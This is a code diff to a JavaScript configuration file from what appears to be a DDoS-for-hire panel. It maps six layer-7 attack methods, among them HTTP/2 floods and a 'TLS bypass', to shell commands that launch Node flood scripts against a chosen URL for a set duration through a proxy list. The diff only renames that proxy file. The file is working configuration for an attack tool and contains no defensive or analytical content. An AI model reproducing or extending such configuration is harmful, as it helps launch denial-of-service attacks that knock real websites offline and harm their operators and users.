@@ -16,27 +16,27 @@ let definitions = {
 let methods = {
     layer7: {
         H2FLASH: {
-            Command: 'cd /root/.xyran/ && node h2-flash.js {url} {time} 64 4 proxy.txt',
+            Command: 'cd /root/.xyran/ && node h2-flash.js {url} {time} 64 4 px.txt',
             Type: 'layer7'
         },
         H2FLOOD: {
-            Command: 'cd /root/.xyran/ && node h2-flood.js {url} {time} 64 4 proxy.txt',
+            Command: 'cd /root/.xyran/ && node h2-flood.js {url} {time} 64 4 px.txt',
             Type: 'layer7'
         },
         TLSBYPASS: {
-            Command: 'cd /root/.xyran/ && node tls-bypass.js {url} {time} 62 4 proxy.txt',
+            Command: 'cd /root/.xyran/ && node tls-bypass.js {url} {time} 62 4 px.txt',
             Type: 'layer7'
         },
         HTTPS: {
-            Command: 'cd /root/.xyran/ && node https.js {url} {time} 64 4 proxy.txt --query %RAND% --log 200',
+            Command: 'cd /root/.xyran/ && node https.js {url} {time} 64 4 px.txt --query %RAND% --log 200',
             Type: 'layer7'
         },
         MIXBIL: {
-            Command: 'cd /root/.xyran/ && node mixbil.js {url} {time} 32 4 proxy.txt',
+            Command: 'cd /root/.xyran/ && node mixbil.js {url} {time} 32 4 px.txt',
             Type: 'layer7'
         },
         TLS: {
-            Command: 'cd /root/.xyran/ && node tls.js {url} {time} 32 4 proxy.txt',
+            Command: 'cd /root/.xyran/ && node tls.js {url} {time} 32 4 px.txt',
             Type: 'layer7'
         }
     },
